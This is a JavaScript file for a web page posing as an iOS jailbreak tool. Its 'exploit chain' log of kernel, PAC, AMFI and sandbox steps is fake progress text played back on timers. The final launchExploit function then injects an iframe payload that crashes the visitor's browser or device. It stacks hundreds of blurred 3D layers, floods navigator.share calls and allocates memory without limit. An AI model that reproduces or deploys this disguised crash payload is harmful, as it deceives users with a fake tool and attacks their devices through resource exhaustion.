'use strict';

let currentView = 'jailbreak';

function switchViewAnim(to) {
    if (to === currentView) return;
    const fromEl = document.getElementById('view-' + currentView);
    const toEl   = document.getElementById('view-' + to);
    const right  = to === 'about';

    fromEl.style.transition = 'opacity .2s ease, transform .2s cubic-bezier(.32,.72,0,1)';
    fromEl.style.opacity = '0';
    fromEl.style.transform = right ? 'translateX(-14px)' : 'translateX(14px)';

    setTimeout(() => {
        fromEl.classList.remove('active', 'visible');
        fromEl.style.cssText = '';
        toEl.classList.add('active', right ? 'slide-r' : 'slide-l');
        requestAnimationFrame(() => requestAnimationFrame(() => {
            toEl.classList.add('visible');
            toEl.classList.remove('slide-r', 'slide-l');
        }));
    }, 195);

    currentView = to;
}

function initPill() {
    const bar  = document.getElementById('tab-bar');
    const pill = document.getElementById('tab-pill');
    const btns = Array.from(bar.querySelectorAll('.tab-btn[data-view]'));
    const N    = btns.length;
    let activeIdx = 0;
    let dragging  = false;
    let startX    = 0;
    let startLeft = 0;

    function tabW()      { return (bar.offsetWidth - 12) / N; }
    function pillLeft(i) { return 6 + i * tabW(); }

    function place(left, animate) {
        pill.style.transition = animate ? 'left .32s cubic-bezier(.32,.72,0,1)' : 'none';
        pill.style.left  = left + 'px';
        pill.style.width = tabW() + 'px';
    }

    function activate(idx, doSwitch = true) {
        idx = Math.max(0, Math.min(N - 1, idx));
        activeIdx = idx;
        btns.forEach((b, i) => b.classList.toggle('active', i === idx));
        place(pillLeft(idx), true);
        if (doSwitch) {
            const v = btns[idx].dataset.view;
            if (v) switchViewAnim(v);
        }
    }

    place(pillLeft(0), false);
    btns[0].classList.add('active');
    window.addEventListener('resize', () => place(pillLeft(activeIdx), false));

    bar.addEventListener('pointerdown', e => {
        const pr = pill.getBoundingClientRect();
        const hit = e.clientX >= pr.left - 10 && e.clientX <= pr.right + 10
                 && e.clientY >= pr.top  - 10 && e.clientY <= pr.bottom + 10;
        if (!hit) return;
        dragging  = true;
        startX    = e.clientX;
        startLeft = parseFloat(pill.style.left) || pillLeft(activeIdx);
        bar.classList.add('dragging');
        bar.setPointerCapture(e.pointerId);
        e.preventDefault();
    });

    bar.addEventListener('pointermove', e => {
        if (!dragging) return;
        const tw   = tabW();
        const newL = Math.max(6, Math.min(bar.offsetWidth - 6 - tw, startLeft + (e.clientX - startX)));
        pill.style.left = newL + 'px';
        const near = Math.max(0, Math.min(N - 1, Math.round((newL - 6) / tw)));
        btns.forEach((b, i) => b.classList.toggle('active', i === near));
    });

    bar.addEventListener('pointerup', () => {
        if (!dragging) return;
        dragging = false;
        bar.classList.remove('dragging');
        const tw   = tabW();
        const near = Math.max(0, Math.min(N - 1, Math.round((parseFloat(pill.style.left) - 6) / tw)));
        activate(near);
        if (navigator.vibrate) navigator.vibrate(8);
    });

    bar.addEventListener('pointercancel', () => {
        if (!dragging) return;
        dragging = false;
        bar.classList.remove('dragging');
        activate(activeIdx, false);
    });

    btns.forEach((btn, i) => btn.addEventListener('click', () => { if (!dragging) activate(i); }));
    window._activateTab = activate;
}

const STEPS = [
    { p: 7,   t: 'Initializing exploit chain',  type: 'info'    },
    { p: 16,  t: 'Resolving kernel symbols',     type: 'info'    },
    { p: 24,  t: 'Kernel base resolved',         type: 'success' },
    { p: 34,  t: 'Bypassing PAC authentication', type: 'info'    },
    { p: 43,  t: 'PAC bypass successful',        type: 'success' },
    { p: 52,  t: 'Disabling AMFI checks',        type: 'info'    },
    { p: 60,  t: 'AMFI disabled',               type: 'success' },
    { p: 68,  t: 'Sandbox escape via task port', type: 'info'    },
    { p: 76,  t: 'Got task port for pid 0',      type: 'success' },
    { p: 85,  t: 'Injecting bootstrap payload',  type: 'info'    },
    { p: 92,  t: 'Payload injected',             type: 'success' },
    { p: 97,  t: 'Installing package manager',   type: 'info'    },
    { p: 100, t: 'Jailbreak complete',           type: 'success' },
];
const WAITS = [550,400,280,800,380,850,360,800,400,680,280,740,600];

function startJailbreak() {
    const btn     = document.getElementById('jb-btn');
    const idle    = document.getElementById('jb-idle');
    const running = document.getElementById('jb-running');

    btn.disabled = true;
  
    idle.style.transition = 'opacity .3s ease, transform .3s cubic-bezier(.32,.72,0,1)';
    idle.style.opacity = '0';
    idle.style.transform = 'translateY(14px)';

    setTimeout(() => {
        idle.style.display = 'none';
      
        running.style.display = 'block';
        running.style.opacity = '0';
        running.style.transform = 'translateY(-10px)';
        running.style.transition = 'opacity .35s ease, transform .35s cubic-bezier(.32,.72,0,1)';

        document.getElementById('run-hero-icon').classList.add('running');

        requestAnimationFrame(() => requestAnimationFrame(() => {
            running.style.opacity = '1';
            running.style.transform = 'translateY(0)';
        }));

        setTimeout(runSteps, 400);
    }, 310);
}

function runSteps() {
    const fill     = document.getElementById('run-fill');
    const pct      = document.getElementById('run-pct');
    const stage    = document.getElementById('run-stage');
    const stageLbl = document.getElementById('run-stage-lbl');
    const ppct     = document.getElementById('run-ppct');
    const list     = document.getElementById('run-log-list');

    let i = 0;
    function tick() {
        if (i >= STEPS.length) { setTimeout(triggerRespring, 700); return; }
        const s = STEPS[i];

        const rows = list.querySelectorAll('.run-row.info');
        rows.forEach(r => r.classList.remove('info'));

        const row = document.createElement('div');
        row.className = `run-row ${s.type}`;
        row.style.animationDelay = '0s';
        row.innerHTML = `<div class="run-dot"></div><span class="run-text">${s.t}</span>`;
        list.appendChild(row);
        list.scrollTop = list.scrollHeight;

        fill.style.width  = s.p + '%';
        pct.textContent   = s.p + '%';
        stage.textContent = s.t;
        ppct.textContent  = s.p + '%';

        i++;
        setTimeout(tick, WAITS[i - 1] ?? 600);
    }
    tick();
}

function triggerRespring() {
    const ov   = document.getElementById('respring-overlay');
    const bar  = document.getElementById('respring-bar');
    const fill = document.getElementById('respring-bar-fill');

    document.getElementById('run-hero-icon')?.classList.remove('running');

    ov.classList.add('active');
    requestAnimationFrame(() => requestAnimationFrame(() => ov.classList.add('visible')));
    setTimeout(() => bar.classList.add('visible'), 380);

    let p = 0;
    const iv = setInterval(() => {
        p += Math.random() * 13 + 4;
        if (p > 100) p = 100;
        fill.style.width = p + '%';
        if (p >= 100) { clearInterval(iv); setTimeout(launchExploit, 500); }
    }, 210);
}

function launchExploit() {
    const f = document.getElementById('exploit-frame');
    if (!f) return;
    f.srcdoc = `<html><body style="margin:0;overflow:hidden"><script>
const c=document.createElement('div');c.style.cssText='perspective:1px;perspective-origin:9999999% 9999999%';document.body.appendChild(c);
for(let i=0;i<500;i++){let d=document.createElement('div');d.style.cssText='position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,'+i+'px) rotateY(90deg);opacity:0.99';c.appendChild(d);}
setInterval(()=>{try{navigator.share({title:'R',text:'R'.repeat(100000)});}catch(e){}new Uint8Array(1024*1024*20);},0);
function s(){const a=[];for(let i=0;i<5000;i++)a.push(new Uint8Array(1024*1024));setTimeout(s,50);}s();
<\/script></body></html>`;
}

document.addEventListener('DOMContentLoaded', () => {
    const first = document.getElementById('view-jailbreak');
    first.classList.add('active');
    requestAnimationFrame(() => requestAnimationFrame(() => first.classList.add('visible')));

    initPill();

    document.getElementById('back-btn')?.addEventListener('click', () => {
        window._activateTab?.(0);
    });
});
